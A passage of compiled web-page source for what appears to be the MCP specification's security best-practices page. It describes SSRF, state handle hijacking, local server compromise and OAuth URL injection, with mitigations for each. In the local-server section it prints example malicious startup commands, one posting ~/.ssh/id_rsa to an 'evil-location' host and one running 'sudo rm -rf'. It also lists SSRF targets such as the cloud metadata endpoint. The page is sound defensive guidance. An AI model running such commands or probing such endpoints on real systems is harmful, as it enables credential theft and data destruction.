(SSRF)`}),`\n`,_jsx(_components.p,{children:`Server-Side Request Forgery (SSRF) is an attack where an attacker can\ninduce an MCP client to make HTTP requests to unintended destinations,\npotentially accessing internal network resources, cloud metadata\nendpoints, or other protected services.`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-2`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`During OAuth metadata discovery, MCP clients fetch URLs from several\nsources that could be controlled by a malicious MCP server:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[`The `,_jsx(_components.code,{children:`resource_metadata`}),` URL from the `,_jsx(_components.code,{children:`WWW-Authenticate`}),` header`]}),`\n`,_jsxs(_components.li,{children:[`The `,_jsx(_components.code,{children:`authorization_servers`}),` URLs from the Protected Resource Metadata\ndocument`]}),`\n`,_jsxs(_components.li,{children:[`The `,_jsx(_components.code,{children:`token_endpoint`}),`, `,_jsx(_components.code,{children:`authorization_endpoint`}),`, and other URLs from\nAuthorization Server Metadata`]}),`\n`]}),`\n`,_jsx(_components.p,{children:`A malicious MCP server can populate these fields with URLs pointing to\ninternal resources, enabling the following attack patterns:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Direct internal IP access`}),`: URLs like `,_jsx(_components.code,{children:`http://192.168.1.1/admin`}),` or\n`,_jsx(_components.code,{children:`http://10.0.0.1/api`}),` target internal network services`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Cloud metadata endpoints`}),`: URLs targeting\n`,_jsx(_components.code,{children:`http://169.254.169.254/`}),` (AWS/GCP/Azure metadata service) can\nexfiltrate cloud credentials and instance information`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Localhost services`}),`: URLs like `,_jsx(_components.code,{children:`http://localhost:6379/`}),` can interact\nwith local services (Redis, databases, admin panels)`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`DNS rebinding`}),`: Domains that change DNS resolution between\nvalidation and use (e.g., `,_jsx(_components.code,{children:`https://attacker.com`}),` resolving to a safe\nIP initially, then to `,_jsx(_components.code,{children:`192.168.1.1`}),`)`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Redirect chains`}),`: Normal-looking URLs that redirect to internal\nresources`]}),`\n`]}),`\n`,_jsx(Mermaid,{chart:`sequenceDiagram\n    participant Client as MCP Client\n    participant MCP as Malicious MCP Server\n    participant Internal as Internal Service\n\n    Client-\u003e\u003eMCP: Connect to MCP server\n    MCP--\u003e\u003eClient: 401 + resource_metadata=\"http://169.254.169.254/...\"\n\n    Note over Client: Client follows URL without validation\n    Client-\u003e\u003eInternal: GET http://169.254.169.254/latest/meta-data/\n    Internal--\u003e\u003eClient: Cloud credentials/metadata\n\n    Note over Client: Error or response details leak to attacker\n    Client-\u003e\u003eMCP: Subsequent request with error details`}),`\n`,_jsx(Heading,{level:`4`,id:`risks-2`,children:`Risks`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Credential exfiltration`}),`: Cloud metadata endpoints often expose\nIAM credentials, API keys, and other secrets`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Internal network reconnaissance`}),`: Error messages reveal information\nabout internal network topology and services`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Service interaction`}),`: POST requests (e.g., to token endpoints) can\ntrigger mutations on internal services`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Firewall bypass`}),`: The MCP client acts as a proxy, bypassing network\nperimeter controls`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data exfiltration`}),`: Internal service responses may be reflected back\nto attackers through error messages or OAuth flows`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-3`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`MCP clients deployed to a server `,_jsx(_components.strong,{children:`MUST`}),` consider SSRF risks and\nimplement appropriate mitigations when fetching OAuth-related URLs.\nWhich protections are appropriate depend on your network environment.`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Enforce HTTPS`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` require HTTPS for all OAuth-related URLs in\nproduction environments:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Reject `,_jsx(_components.code,{children:`http://`}),` URLs except for loopback addresses (`,_jsx(_components.code,{children:`localhost`}),`,\n`,_jsx(_components.code,{children:`127.0.0.1`}),`, `,_jsx(_components.code,{children:`::1`}),`) during development`]}),`\n`,_jsxs(_components.li,{children:[`This aligns with\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5`,children:`OAuth 2.1 Section 1.5`}),`\nwhich requires HTTPS for all OAuth protocol URLs except loopback\nredirect URIs`]}),`\n`,_jsx(_components.li,{children:`Provide an explicit opt-out mechanism for development/testing\nscenarios`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Block Private IP Ranges`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` block requests to private and reserved IP address\nranges as recommended by\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/rfc9728#section-7.7`,children:`RFC 9728 Section 7.7`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Private IPv4 ranges: `,_jsx(_components.code,{children:`10.0.0.0/8`}),`, `,_jsx(_components.code,{children:`172.16.0.0/12`}),`,\n`,_jsx(_components.code,{children:`192.168.0.0/16`})]}),`\n`,_jsxs(_components.li,{children:[`Loopback: `,_jsx(_components.code,{children:`127.0.0.0/8`}),`, `,_jsx(_components.code,{children:`::1`}),` (except when explicitly allowed for\ndevelopment)`]}),`\n`,_jsxs(_components.li,{children:[`Link-local: `,_jsx(_components.code,{children:`169.254.0.0/16`}),` (including cloud metadata endpoints)`]}),`\n`,_jsxs(_components.li,{children:[`Private IPv6 ranges: `,_jsx(_components.code,{children:`fc00::/7`}),`, `,_jsx(_components.code,{children:`fe80::/10`})]}),`\n`]}),`\n`,_jsx(Note,{children:_jsx(_components.p,{children:`Avoid implementing IP validation manually. Attackers exploit encoding tricks\n(octal, hex, IPv4-mapped IPv6) that custom parsers often miss.`})}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Validate Redirect Targets`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` apply the same URL validation to redirect\ntargets:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Do not blindly follow redirects to internal resources`}),`\n`,_jsx(_components.li,{children:`Apply HTTPS and IP range restrictions to redirect destinations`}),`\n`,_jsx(_components.li,{children:`Consider disabling automatic redirect following and validating each\nhop`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Use Egress Proxies`})}),`\n`,_jsxs(_components.p,{children:[`For server-side MCP client deployments, operators `,_jsx(_components.strong,{children:`SHOULD`}),` consider\nusing an egress proxy that enforces network policies:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Route OAuth discovery requests through a proxy that blocks internal\ndestinations`}),`\n`,_jsxs(_components.li,{children:[`Use tools like\n`,_jsx(_components.a,{href:`https://github.com/stripe/smokescreen`,children:`Smokescreen`}),` or similar\negress proxies that prevent SSRF by design`]}),`\n`,_jsx(_components.li,{children:`Configure network policies to restrict the MCP client’s outbound\naccess`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`DNS Resolution Considerations`})}),`\n`,_jsx(_components.p,{children:`Be aware of Time-of-Check to Time-of-Use (TOCTOU) issues with\nDNS-based validation:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`An attacker’s domain may resolve to a safe IP during validation but\nto an internal IP during the actual request`}),`\n`,_jsx(_components.li,{children:`Consider pinning DNS resolution results between check and use`}),`\n`,_jsx(_components.li,{children:`Defense in depth: combine DNS checks with other mitigations`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`ssrf-against-authorization-servers`,children:`SSRF Against Authorization Servers`}),`\n`,_jsxs(_components.p,{children:[`SSRF risks are not limited to MCP clients. When an authorization\nserver supports\n`,_jsx(_components.a,{href:`/specification/2026-07-28/basic/authorization/client-registration#client-id-metadata-documents`,children:`Client ID Metadata Documents`}),`,\nthe authorization server takes a URL as input from an unknown client\nand fetches that URL. A malicious client could use this to trigger\nthe authorization server to make requests to arbitrary URLs, such as\nrequests to private administration endpoints the authorization server\nhas access to.`]}),`\n`,_jsxs(_components.p,{children:[`The mitigations described above, such as blocking private IP ranges\nand using egress proxies, apply equally to authorization servers\nfetching client metadata documents. See\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-server-side-request-forgery`,children:`Server Side Request Forgery (SSRF) Attacks`}),`\nin the Client ID Metadata Document specification for further\nguidance.`]}),`\n`,_jsx(Heading,{level:`4`,id:`resources-and-tools`,children:`Resources and Tools`}),`\n`,_jsx(_components.p,{children:`The following resources can help developers implement SSRF protections\nin MCP clients.`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Reference Documentation`})}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.a,{href:`https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html`,children:`OWASP SSRF Prevention Cheat Sheet`}),`:\nComprehensive guidance on SSRF prevention techniques, including input\nvalidation, allowlist strategies, and network-level controls`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.a,{href:`https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/`,children:`OWASP Top 10 A10:2021 - SSRF`}),`:\nSSRF in the context of the most critical web application security\nrisks`]}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`state-handle-hijacking`,children:`State Handle Hijacking`}),`\n`,_jsxs(_components.p,{children:[`MCP is `,_jsx(_components.a,{href:`/specification/2026-07-28/basic/index#statelessness`,children:`stateless`}),` and\nhas no protocol-level sessions. Servers that need state spanning\nmultiple requests mint an explicit handle, such as a shopping cart ID\nor a workflow ID, and receive it back as an ordinary tool argument on\neach request. State handle hijacking is an attack vector where an\nunauthorized party obtains or guesses such a handle and uses it to\naccess or modify another user’s state.`]}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-3`,children:`Attack Description`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`The MCP server mints a state handle for an authenticated user and\nreturns it in a tool result.`}),`\n`,_jsx(_components.li,{children:`The attacker obtains or guesses the handle.`}),`\n`,_jsx(_components.li,{children:`The attacker calls the MCP server’s tools with the handle as an\nargument.`}),`\n`,_jsx(_components.li,{children:`The MCP server does not check whether the handle belongs to the\ncaller and operates on the original user’s state, allowing\nunauthorized access or actions.`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-4`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`MCP servers that implement authorization `,_jsx(_components.strong,{children:`MUST`}),` verify all inbound\nrequests. MCP servers `,_jsx(_components.strong,{children:`MUST NOT`}),` treat possession of a state handle\nas authentication.`]}),`\n`,_jsxs(_components.p,{children:[`MCP servers `,_jsx(_components.strong,{children:`SHOULD`}),` use secure, non-deterministic handles generated\nwith secure random number generators. Avoid predictable or sequential\nidentifiers that could be guessed by an attacker. Expiring handles can\nalso reduce the risk.`]}),`\n`,_jsxs(_components.p,{children:[`MCP servers `,_jsx(_components.strong,{children:`SHOULD`}),` bind handles server-side to the authenticated\nuser, for example by keying stored state as `,_jsx(_components.code,{children:`\u003cuser_id\u003e:\u003chandle\u003e`}),` where\nthe user ID is derived from the verified token rather than supplied by\nthe client, and reject a handle presented by any other principal. This\nensures that even if an attacker guesses a handle, they cannot\nimpersonate another user.`]}),`\n`,_jsxs(_components.p,{children:[`For guidance on securing the server-assigned session IDs used by\nprotocol version `,_jsx(_components.code,{children:`2025-11-25`}),` and earlier, see\n`,_jsx(_components.a,{href:`/docs/2025-11-25/tutorials/security/security_best_practices#session-hijacking`,children:`Session Hijacking in the 2025-11-25 version of this page`}),`.`]}),`\n`,_jsx(Heading,{level:`3`,id:`local-mcp-server-compromise`,children:`Local MCP Server Compromise`}),`\n`,_jsx(_components.p,{children:`Local MCP servers are MCP Servers running on a user’s local machine,\neither by the user downloading and executing a server, authoring a\nserver themselves, or installing through a client’s configuration flows.\nThese servers may have direct access to the user’s system and may be\naccessible to other processes running on the user’s machine, making them\nattractive targets for attacks.`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-4`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`Local MCP servers are binaries that are downloaded and executed on the\nsame machine as the MCP client. Without proper sandboxing and consent\nrequirements in place, the following attacks become possible:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`An attacker includes a malicious “startup” command in a client\nconfiguration`}),`\n`,_jsx(_components.li,{children:`An attacker distributes a malicious payload inside the server itself`}),`\n`,_jsx(_components.li,{children:`An attacker accesses an insecure local server that’s left running on\nlocalhost via DNS rebinding`}),`\n`]}),`\n`,_jsx(_components.p,{children:`Example malicious startup commands that could be embedded:`}),`\n`,_jsx(CodeBlock,{filename:``,numberOfLines:`5`,language:`shellscript`,children:_jsx(_components.pre,{className:`shiki shiki-themes github-light-default dark-plus`,style:{backgroundColor:`#ffffff`,\"--shiki-dark-bg\":`#0B0C0E`,color:`#1f2328`,\"--shiki-dark\":`#D4D4D4`},language:`shellscript`,children:_jsxs(_components.code,{language:`shellscript`,numberOfLines:`5`,children:[_jsx(_components.span,{className:`line`,children:_jsx(_components.span,{style:{color:`#6E7781`,\"--shiki-dark\":`#6A9955`},children:`# Data exfiltration`})}),`\n`,_jsxs(_components.span,{className:`line`,children:[_jsx(_components.span,{style:{color:`#953800`,\"--shiki-dark\":`#DCDCAA`},children:`npx`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` malicious-package`}),_jsx(_components.span,{style:{color:`#1F2328`,\"--shiki-dark\":`#D4D4D4`},children:` \u0026\u0026 `}),_jsx(_components.span,{style:{color:`#953800`,\"--shiki-dark\":`#DCDCAA`},children:`curl`}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#569CD6`},children:` -X`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` POST`}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#569CD6`},children:` -d`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` @~/.ssh/id_rsa`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` https://example.com/evil-location`})]}),`\n`,_jsx(_components.span,{className:`line`}),`\n`,_jsx(_components.span,{className:`line`,children:_jsx(_components.span,{style:{color:`#6E7781`,\"--shiki-dark\":`#6A9955`},children:`# Privilege escalation`})}),`\n`,_jsxs(_components.span,{className:`line`,children:[_jsx(_components.span,{style:{color:`#953800`,\"--shiki-dark\":`#DCDCAA`},children:`sudo`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` rm`}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#569CD6`},children:` -rf`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` /important/system/files`}),_jsx(_components.span,{style:{color:`#1F2328`,\"--shiki-dark\":`#D4D4D4`},children:` \u0026\u0026 `}),_jsx(_components.span,{style:{color:`#0550AE`,\"--shiki-dark\":`#DCDCAA`},children:`echo`}),_jsx(_components.span,{style:{color:`#0A3069`,\"--shiki-dark\":`#CE9178`},children:` \"MCP server installed!\"`})]}),`\n`]})})}),`\n`,_jsx(Heading,{level:`4`,id:`risks-3`,children:`Risks`}),`\n`,_jsx(_components.p,{children:`Local MCP servers with inadequate restrictions or from untrusted sources\nintroduce several critical security risks:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Arbitrary code execution`}),`. Attackers can execute any command with\nMCP client privileges.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`No visibility`}),`. Users have no insight into what commands are being\nexecuted.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Command obfuscation`}),`. Malicious actors can use complex or\nconvoluted commands to appear legitimate.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data exfiltration`}),`. Attackers can access legitimate local MCP\nservers via compromised JavaScript.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data loss`}),`. Attackers or bugs in legitimate servers could lead to\nirrecoverable data loss on the host machine.`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-5`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`If an MCP client supports one-click local MCP server configuration, it\n`,_jsx(_components.strong,{children:`MUST`}),` implement proper consent mechanisms prior to executing commands.`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Pre-Configuration Consent`})}),`\n`,_jsxs(_components.p,{children:[`Display a clear consent dialog before connecting a new local MCP server\nvia one-click configuration. The MCP client `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Show the exact command that will be executed, without truncation\n(include arguments and parameters)`}),`\n`,_jsx(_components.li,{children:`Clearly identify it as a potentially dangerous operation that executes\ncode on the user’s system`}),`\n`,_jsx(_components.li,{children:`Require explicit user approval before proceeding`}),`\n`,_jsx(_components.li,{children:`Allow users to cancel the configuration`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`The MCP client `,_jsx(_components.strong,{children:`SHOULD`}),` implement additional checks and guardrails to\nmitigate potential code execution attack vectors:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Highlight potentially dangerous command patterns (e.g., commands\ncontaining `,_jsx(_components.code,{children:`sudo`}),`, `,_jsx(_components.code,{children:`rm -rf`}),`, network operations, file system access\noutside expected directories)`]}),`\n`,_jsx(_components.li,{children:`Display warnings for commands that access sensitive locations (home\ndirectory, SSH keys, system directories)`}),`\n`,_jsx(_components.li,{children:`Warn that MCP servers run with the same privileges as the client`}),`\n`,_jsx(_components.li,{children:`Execute MCP server commands in a sandboxed environment with minimal\ndefault privileges`}),`\n`,_jsx(_components.li,{children:`Launch MCP servers with restricted access to the file system, network,\nand other system resources`}),`\n`,_jsx(_components.li,{children:`Provide mechanisms for users to explicitly grant additional privileges\n(e.g., specific directory access, network access) when needed`}),`\n`,_jsx(_components.li,{children:`Use platform-appropriate sandboxing technologies (containers, chroot,\napplication sandboxes, etc.)`}),`\n`,_jsx(_components.li,{children:`Keep sandboxing solutions up-to-date to account for emerging\nvulnerabilities`}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`MCP servers intending for their servers to be run locally `,_jsx(_components.strong,{children:`SHOULD`}),`\nimplement measures to prevent unauthorized usage from malicious\nprocesses:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Use the `,_jsx(_components.code,{children:`stdio`}),` transport to limit access to just the MCP client`]}),`\n`,_jsxs(_components.li,{children:[`Restrict access if using an HTTP transport, such as:`,`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Require an authorization token`}),`\n`,_jsx(_components.li,{children:`Use unix domain sockets or other Interprocess Communication (IPC)\nmechanisms with restricted access`}),`\n`]}),`\n`]}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`oauth-authorization-url-validation`,children:`OAuth Authorization URL Validation`}),`\n`,_jsx(_components.p,{children:`OAuth authorization URLs provided by malicious MCP servers can exploit client-side URL handling vulnerabilities, leading to Cross-Site Scripting (XSS) attacks and Remote Code Execution (RCE).`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-5`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`During the OAuth authorization flow, MCP servers provide authorization URLs that clients open in browsers or handle programmatically. Malicious servers can exploit insufficient URL validation in MCP clients through the following attack vectors:`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`JavaScript URL Injection (XSS)`})}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[`A malicious MCP server provides a `,_jsx(_components.code,{children:`javascript:`}),` URL as the authorization endpoint`]}),`\n`,_jsxs(_components.li,{children:[`The MCP client passes this URL directly to `,_jsx(_components.code,{children:`window.open()`}),` or similar browser APIs`]}),`\n`,_jsx(_components.li,{children:`The browser executes the JavaScript code embedded in the URL`}),`\n`,_jsx(_components.li,{children:`The attacker gains JavaScript execution context within the client application, potentially leading to session hijacking, credential theft, or further exploitation`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Command Injection via Shell Execution`})}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`A malicious MCP server provides a URL containing shell command injection payloads`}),`\n`,_jsxs(_components.li,{children:[`The MCP client uses shell commands (e.g., `,_jsx(_components.code,{children:`cmd.exe`}),`, PowerShell, or shell scripts) to open the URL`]}),`\n`,_jsx(_components.li,{children:`The shell interprets parts of the URL as additional commands to execute`}),`\n`,_jsx(_components.li,{children:`The attacker achieves arbitrary code execution on the user’s system`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`stdio Transport Privilege Escalation`})}),`\n`,_jsxs(_components.p,{children:[`When XSS vulnerabilities are combined with `,_jsx(_components.code,{children:`stdio`}),` transport capabilities,\nattackers can escalate web-based attacks to full system compromise. See\n`,_jsx(_components.a,{href:`#stdio-transport-security-in-proxy-scenarios`,children:`stdio Transport Security in Proxy Scenarios`}),`\nfor detailed attack vectors and mitigations.`]}),`\n`,_jsx(Mermaid,{chart:`sequenceDiagram\n    participant MaliciousMCP as Malicious MCP Server\n    participant Client as MCP Client\n    participant Proxy as MCP Proxy\n    participant System as Host System\n\n    MaliciousMCP-\u003e\u003eClient: Malicious authorization URL (javascript:)\n    Client-\u003e\u003eClient: Execute JavaScript (XSS)\n    Client-\u003e\u003eClient: Extract proxy auth token\n    Client-\u003e\u003eProxy: Malicious stdio command request\n    Note over Client,Proxy: Using stolen authentication token\n    Proxy-\u003e\u003eSystem: Execute arbitrary command\n    System--\u003e\u003eProxy: Command output\n    Proxy--\u003e\u003eClient: Command result\n    Client--\u003e\u003eMaliciousMCP: Exfiltrate data/establish persistence`}),`\n`,_jsx(Heading,{level:`4`,id:`risks-4`,children:`Risks`}),`\n`,_jsx(_components.p,{children:`OAuth authorization URL vulnerabilities introduce several critical security risks:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Cross-Site Scripting (XSS)`}),`. Malicious JavaScript execution can lead to session hijacking, credential theft, and unauthorized actions within the client application.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Remote Code Execution (RCE)`}),`. Command injection through shell execution allows attackers to run arbitrary code with user privileges.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Privilege Escalation`}),`. XSS combined with `,_jsx(_components.code,{children:`stdio`}),` transport can escalate web-based attacks to full system compromise.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Data Exfiltration`}),`. Attackers can access sensitive data, configuration files, and credentials stored on the user’s system.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Persistence`}),`. Attackers can install malware, create backdoors, or modify system configurations for persistent access.`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-6`,children:`Mitigation`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`URL Scheme Validation`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`MUST`}),` validate authorization URLs and reject dangerous schemes:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`MUST`}),` only allow `,_jsx(_components.code,{children:`http://`}),` and `,_jsx(_components.code,{children:`https://`}),` schemes for authorization URLs.\nThe `,_jsx(_components.code,{children:`http://`}),` scheme is acceptable only for loopback addresses (such as\n`,_jsx(_components.code,{children:`localhost`}),`, `,_jsx(_components.code,{children:`127.0.0.1`}),`, or `,_jsx(_components.code,{children:`::1`}),`) during local development; authorization\nservers in production `,_jsx(_components.strong,{children:`MUST`}),` use `,_jsx(_components.code,{children:`https://`}),`.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`MUST`}),` reject `,_jsx(_components.code,{children:`javascript:`}),`, `,_jsx(_components.code,{children:`data:`}),`, `,_jsx(_components.code,{children:`file:`}),`, `,_jsx(_components.code,{children:`vbscript:`}),`, and other potentially dangerous schemes`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`SHOULD`}),` use allowlist-based validation rather than blocklist-based approaches`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Secure URL Opening`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`MUST`}),` avoid shell execution when opening URLs:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`MUST NOT`}),` use shell commands (e.g., `,_jsx(_components.code,{children:`cmd.exe`}),`, `,_jsx(_components.code,{children:`sh`}),`, PowerShell) to open URLs`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`SHOULD`}),` use platform-specific, non-shell URL opening mechanisms`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Content Security Policy (CSP)`})}),`\n`,_jsxs(_components.p,{children:[`Web-based MCP clients `,_jsx(_components.strong,{children:`SHOULD`}),` implement Content Security Policy headers to prevent JavaScript execution:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Set `,_jsx(_components.code,{children:`script-src 'self'`}),` to prevent execution of inline JavaScript`]}),`\n`,_jsxs(_components.li,{children:[`Use `,_jsx(_components.code,{children:`default-src 'self'`}),` to restrict resource loading`]}),`\n`,_jsxs(_components.li,{children:[`Consider `,_jsx(_components.code,{children:`script-src 'nonce-\u003crandom\u003e'`}),` for dynamic content that requires inline scripts`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Input Sanitization`})}),`\n`,_jsxs(_components.p,{children:[`MCP clients `,_jsx(_components.strong,{children:`MUST`}),` sanitize and validate all URLs received from MCP servers:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Implement strict URL parsing and validation`}),`\n`,_jsx(_components.li,{children:`Reject URLs with special characters that could be interpreted by shells`}),`\n`,_jsx(_components.li,{children:`Consider using dedicated URL sanitization libraries`}),`\n`,_jsx(_components.li,{children:`Log suspicious authorization URLs for security monitoring`}),`\n`]}),`\n`,_jsx(Heading,{level:`3`,id:`stdio-transport-security-in-proxy-scenarios`,children:`stdio Transport Security in Proxy Scenarios`}),`\n`,_jsxs(_components.p,{children:[`The `,_jsx(_components.code,{children:`stdio`}),` transport itself is not inherently vulnerable. However, in proxy architectures where a separate proxy service manages `,_jsx(_components.code,{children:`stdio`}),` connections and can spawn MCP servers as child processes, it can provide a critical escalation path from web-based attacks to full system compromise.`]}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description-6`,children:`Attack Description`}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Important`}),`: This attack vector only applies to MCP implementations that use a proxy architecture, not to direct `,_jsx(_components.code,{children:`stdio`}),` transport usage.`]}),`\n`,_jsxs(_components.p,{children:[`In proxy-based MCP implementations, a local proxy service sits between the client and MCP servers, spawning servers as child processes via the `,_jsx(_components.code,{children:`stdio`}),` transport. This architecture creates a privileged escalation path when combined with client-side vulnerabilities:`]}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`Attacker achieves XSS or other client-side code execution (e.g., through OAuth URL vulnerabilities)`}),`\n`,_jsx(_components.li,{children:`Using the attack vector above, the malicious actor accesses the MCP proxy authentication token established between the client and the proxy from the client’s environment`}),`\n`,_jsx(_components.li,{children:`Malicious actor makes authenticated requests to the local MCP proxy service`}),`\n`,_jsxs(_components.li,{children:[`Proxy spawns arbitrary commands via the `,_jsx(_components.code,{children:`stdio`}),` transport (believing they are legitimate MCP server commands)`]}),`\n`,_jsx(_components.li,{children:`Attacker achieves Remote Code Execution with user privileges`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`risks-5`,children:`Risks`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Privilege Escalation`}),`. Web-based vulnerabilities (XSS) can escalate to arbitrary code execution on the host system through proxy command execution`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Authentication Bypass`}),`. Stolen proxy authentication tokens allow unauthorized access to stdio process spawning capabilities`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`System Compromise`}),`. Attackers can execute any command that the MCP proxy process has privileges to 